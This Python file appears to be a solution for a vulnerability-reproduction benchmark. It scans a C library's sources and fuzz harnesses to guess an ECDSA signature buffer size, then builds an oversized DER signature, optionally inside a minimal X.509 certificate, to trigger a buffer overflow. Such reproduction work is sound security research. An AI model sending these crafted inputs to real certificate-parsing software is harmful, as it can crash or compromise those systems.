import os
import re
import tarfile
import ast
from typing import Dict, List, Tuple, Optional


class _SafeEval(ast.NodeVisitor):
    __slots__ = ("ok",)

    def __init__(self) -> None:
        self.ok = True

    def generic_visit(self, node):
        self.ok = False

    def visit_Expression(self, node):
        self.visit(node.body)

    def visit_Constant(self, node):
        if not isinstance(node.value, int):
            self.ok = False

    def visit_Num(self, node):
        if not isinstance(node.n, int):
            self.ok = False

    def visit_UnaryOp(self, node):
        if not isinstance(node.op, (ast.UAdd, ast.USub, ast.Invert)):
            self.ok = False
            return
        self.visit(node.operand)

    def visit_BinOp(self, node):
        if not isinstance(
            node.op,
            (
                ast.Add,
                ast.Sub,
                ast.Mult,
                ast.FloorDiv,
                ast.Mod,
                ast.LShift,
                ast.RShift,
                ast.BitOr,
                ast.BitAnd,
                ast.BitXor,
            ),
        ):
            self.ok = False
            return
        self.visit(node.left)
        self.visit(node.right)

    def visit_Paren(self, node):  # pragma: no cover
        self.visit(node.value)


def _strip_c_comments(s: str) -> str:
    s = re.sub(r"/\*.*?\*/", "", s, flags=re.S)
    s = re.sub(r"//.*?$", "", s, flags=re.M)
    return s


def _sanitize_c_int_literals(expr: str) -> str:
    expr = re.sub(r"\b(0[xX][0-9A-Fa-f]+|\d+)[uUlL]+\b", r"\1", expr)
    return expr


def _eval_int_expr(expr: str, defines: Dict[str, int]) -> Optional[int]:
    if not expr:
        return None
    expr = _strip_c_comments(expr).strip()
    if not expr:
        return None
    if "\n" in expr or "\\" in expr:
        return None
    if "sizeof" in expr or "?" in expr or ":" in expr:
        return None
    expr = _sanitize_c_int_literals(expr)

    expr = re.sub(r"/", "//", expr)

    for _ in range(10):
        changed = False

        def repl(m):
            nonlocal changed
            name = m.group(0)
            if name in defines:
                changed = True
                return str(defines[name])
            return name

        expr2 = re.sub(r"\b[A-Za-z_]\w*\b", repl, expr)
        expr = expr2
        if not changed:
            break

    if re.search(r"\b[A-Za-z_]\w*\b", expr):
        return None

    try:
        tree = ast.parse(expr, mode="eval")
    except Exception:
        return None

    v = _SafeEval()
    v.visit(tree)
    if not v.ok:
        return None

    try:
        val = eval(compile(tree, "<expr>", "eval"), {"__builtins__": {}}, {})
    except Exception:
        return None

    if not isinstance(val, int):
        return None
    if val < 0:
        return None
    return val


def _read_sources(src_path: str) -> List[Tuple[str, str]]:
    out: List[Tuple[str, str]] = []
    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                p = os.path.join(root, fn)
                rel = os.path.relpath(p, src_path)
                if not any(rel.lower().endswith(ext) for ext in (".c", ".h", ".cc", ".cpp", ".hpp", ".cxx")):
                    if "fuzz" not in rel.lower():
                        continue
                try:
                    if os.path.getsize(p) > 2_000_000:
                        continue
                    with open(p, "rb") as f:
                        data = f.read()
                    try:
                        text = data.decode("utf-8", errors="ignore")
                    except Exception:
                        continue
                    out.append((rel.replace("\\", "/"), text))
                except Exception:
                    continue
        return out

    try:
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isreg():
                    continue
                name = m.name
                lname = name.lower()
                if not any(lname.endswith(ext) for ext in (".c", ".h", ".cc", ".cpp", ".hpp", ".cxx")):
                    if "fuzz" not in lname and "oss-fuzz" not in lname:
                        continue
                if m.size <= 0 or m.size > 2_000_000:
                    continue
                try:
                    f = tf.extractfile(m)
                    if not f:
                        continue
                    data = f.read()
                    try:
                        text = data.decode("utf-8", errors="ignore")
                    except Exception:
                        continue
                    out.append((name, text))
                except Exception:
                    continue
    except Exception:
        return []
    return out


def _parse_defines(files: List[Tuple[str, str]]) -> Dict[str, int]:
    defs_raw: Dict[str, str] = {}
    for _, text in files:
        for line in text.splitlines():
            if "#define" not in line:
                continue
            m = re.match(r"^\s*#\s*define\s+([A-Za-z_]\w*)\s+(.*)$", line)
            if not m:
                continue
            name = m.group(1)
            val = m.group(2).strip()
            if not name or "(" in name:
                continue
            if not val:
                continue
            if val.endswith("\\"):
                continue
            defs_raw[name] = val

    defs_eval: Dict[str, int] = {}
    for _ in range(6):
        changed = False
        for k, v in list(defs_raw.items()):
            if k in defs_eval:
                continue
            iv = _eval_int_expr(v, defs_eval)
            if iv is not None:
                defs_eval[k] = iv
                changed = True
        if not changed:
            break
    return defs_eval


def _detect_input_kind(files: List[Tuple[str, str]]) -> str:
    candidates: List[Tuple[str, str]] = []
    for name, text in files:
        lname = name.lower()
        if "fuzz" in lname or "oss-fuzz" in lname or "fuzzer" in lname:
            candidates.append((name, text))
        elif "llvmfuzzertestoneinput" in text.lower():
            candidates.append((name, text))

    if candidates:
        best = max(candidates, key=lambda nt: ("llvmfuzzertestoneinput" in nt[1].lower(), "fuzz" in nt[0].lower(), len(nt[1])))
        tl = best[1].lower()
        if any(k in tl for k in ("x509", "certificate", "crt_parse", "x509_crt_parse", "x509_parse", "d2i_x509", "x509_load")):
            return "cert"
        if any(k in tl for k in ("ecdsa_sig", "ecdsa", "asn1", "signature")) and not any(
            k in tl for k in ("x509", "certificate", "crt_parse", "x509_crt_parse", "d2i_x509")
        ):
            return "sig"

    joined_hint = "\n".join((n.lower() + "\n" + t.lower()) for n, t in files[:300])
    if "llvmfuzzertestoneinput" in joined_hint and ("x509" in joined_hint or "certificate" in joined_hint):
        return "cert"
    return "sig"


def _guess_overflow_len(files: List[Tuple[str, str]], defines: Dict[str, int]) -> int:
    decl_re = re.compile(
        r"(?m)^\s*(?!#)\s*(?!typedef\b)(?!struct\b)(?!enum\b)(?!union\b)"
        r"(?:const\s+)?(?:unsigned\s+)?(?:signed\s+)?(?:char|short|int|long|uint8_t|uint16_t|uint32_t|byte|u8|uchar)\s+"
        r"([A-Za-z_]\w*)\s*\[\s*([^\]\n]{1,80})\s*\]\s*;"
    )

    interesting_name_re = re.compile(r"(?i)^(?:r|s|rs|sig|sign|signature|asn1|der|ecdsa|ecc|tmp|buf)\b")
    copy_call_re_tpl = r"(?:memcpy|memmove|XMEMCPY|XMEMMOVE)\s*\(\s*{var}\b"

    sizes_scored: List[Tuple[int, int]] = []

    for fname, text in files:
        lname = fname.lower()
        if not any(k in lname for k in ("ecdsa", "ecc", "asn1", "x509", "tls", "ssl", "crypto", "sig", "sign")):
            continue
        tl = text.lower()
        if not ("ecdsa" in tl or "ecc" in tl or "asn1" in tl or "signature" in tl or "x509" in tl):
            continue

        for m in decl_re.finditer(text):
            var = m.group(1)
            sexpr = m.group(2).strip()
            if not var or not sexpr:
                continue
            if "static" in m.group(0):
                continue
            if not interesting_name_re.search(var):
                window = tl[max(0, m.start() - 200) : m.start() + 200]
                if not any(k in window for k in ("ecdsa", "asn1", "signature", "sig", "x509", "ecc")):
                    continue

            sz = _eval_int_expr(sexpr, defines)
            if sz is None:
                continue
            if sz < 8 or sz > 1_000_000:
                continue

            score = 0
            if interesting_name_re.search(var):
                score += 3
            if any(k in lname for k in ("ecdsa", "ecc")):
                score += 3
            if "x509" in lname:
                score += 2
            if any(k in tl for k in ("ecdsa", "ecc")):
                score += 1
            if "asn1" in tl:
                score += 1
            if re.search(copy_call_re_tpl.format(var=re.escape(var)), text):
                score += 3

            window = tl[max(0, m.start() - 300) : m.start() + 500]
            if any(k in window for k in ("sig", "signature", "asn1", "ecdsa")):
                score += 2

            sizes_scored.append((score, sz))

    direct_consts: List[int] = []
    for _, text in files:
        if "ecdsa" not in text.lower() and "signature" not in text.lower() and "asn1" not in text.lower():
            continue
        for cm in re.finditer(r"\b(4096|8192|16384|32768|40960|65536|0x1000|0x2000|0x4000|0x8000|0xA000)\b", text):
            tok = cm.group(1)
            try:
                v = int(tok, 0)
            except Exception:
                continue
            if 8 <= v <= 200_000:
                direct_consts.append(v)

    cand: List[int] = []
    for score, sz in sizes_scored:
        if score >= 6:
            cand.append(sz)

    for k, v in defines.items():
        lk = k.lower()
        if any(w in lk for w in ("sig", "signature", "ecdsa", "ecc", "asn1")) and 8 <= v <= 200_000:
            cand.append(v)

    cand.extend(direct_consts)

    if not cand:
        return 50000

    likely = max(cand)
    if likely < 16:
        likely = 16
    overflow = likely + 1

    if overflow < 256 and any(x >= 4096 for x in cand):
        overflow = max(cand) + 1

    if overflow > 200_000:
        overflow = 200_000
    if overflow < 128:
        overflow = 128
    return overflow


def _der_len(n: int) -> bytes:
    if n < 0:
        raise ValueError("negative length")
    if n <= 127:
        return bytes([n])
    b = n.to_bytes((n.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(b)]) + b


def _der_tag(tag: int, content: bytes) -> bytes:
    return bytes([tag]) + _der_len(len(content)) + content


def _der_int_from_bytes(b: bytes) -> bytes:
    if not b:
        b = b"\x00"
    if b[0] & 0x80:
        b = b"\x00" + b
    return _der_tag(0x02, b)


def _der_seq(items: List[bytes]) -> bytes:
    return _der_tag(0x30, b"".join(items))


def _der_set(items: List[bytes]) -> bytes:
    return _der_tag(0x31, b"".join(items))


def _der_oid(dotted: str) -> bytes:
    parts = dotted.strip().split(".")
    if len(parts) < 2:
        raise ValueError("bad oid")
    nums = [int(x) for x in parts]
    if nums[0] > 2 or nums[1] >= 40:
        raise ValueError("bad oid head")
    out = bytearray()
    out.append(nums[0] * 40 + nums[1])
    for n in nums[2:]:
        if n < 0:
            raise ValueError("bad oid part")
        enc = []
        if n == 0:
            enc = [0]
        else:
            while n > 0:
                enc.append(n & 0x7F)
                n >>= 7
            enc.reverse()
        for i, v in enumerate(enc):
            if i != len(enc) - 1:
                out.append(0x80 | v)
            else:
                out.append(v)
    return _der_tag(0x06, bytes(out))


def _der_printable_string(s: bytes) -> bytes:
    return _der_tag(0x13, s)


def _der_utctime(s: bytes) -> bytes:
    return _der_tag(0x17, s)


def _der_bit_string(payload: bytes, unused_bits: int = 0) -> bytes:
    if not (0 <= unused_bits <= 7):
        unused_bits = 0
    return _der_tag(0x03, bytes([unused_bits]) + payload)


def _der_ctx0_explicit(content: bytes) -> bytes:
    return _der_tag(0xA0, content)


def _build_ecdsa_sig_der(r_len: int, s_len: int = 1) -> bytes:
    if r_len < 1:
        r_len = 1
    if s_len < 1:
        s_len = 1
    r = b"\x01" + (b"A" * (r_len - 1))
    s = b"\x01" + (b"B" * (s_len - 1))
    return _der_seq([_der_int_from_bytes(r), _der_int_from_bytes(s)])


def _build_min_cert_with_ecdsa_sig(sig_der: bytes) -> bytes:
    oid_ecdsa_with_sha256 = _der_oid("1.2.840.10045.4.3.2")
    alg_sig = _der_seq([oid_ecdsa_with_sha256])

    oid_cn = _der_oid("2.5.4.3")
    atv = _der_seq([oid_cn, _der_printable_string(b"a")])
    rdn = _der_set([atv])
    name = _der_seq([rdn])

    validity = _der_seq([_der_utctime(b"250101000000Z"), _der_utctime(b"260101000000Z")])

    oid_ec_public_key = _der_oid("1.2.840.10045.2.1")
    oid_prime256v1 = _der_oid("1.2.840.10045.3.1.7")
    spki_alg = _der_seq([oid_ec_public_key, oid_prime256v1])

    pubkey = b"\x04" + (b"\x01" * 32) + (b"\x02" * 32)
    spki = _der_seq([spki_alg, _der_bit_string(pubkey, 0)])

    version = _der_ctx0_explicit(_der_int_from_bytes(b"\x02"))
    serial = _der_int_from_bytes(b"\x01")

    tbs = _der_seq([version, serial, alg_sig, name, validity, name, spki])

    sig_value = _der_bit_string(sig_der, 0)
    cert = _der_seq([tbs, alg_sig, sig_value])
    return cert


class Solution:
    def solve(self, src_path: str) -> bytes:
        files = _read_sources(src_path)
        defines = _parse_defines(files) if files else {}
        kind = _detect_input_kind(files) if files else "sig"
        overflow_len = _guess_overflow_len(files, defines) if files else 50000

        sig = _build_ecdsa_sig_der(overflow_len, 1)

        if kind == "cert":
            return _build_min_cert_with_ecdsa_sig(sig)
        return sig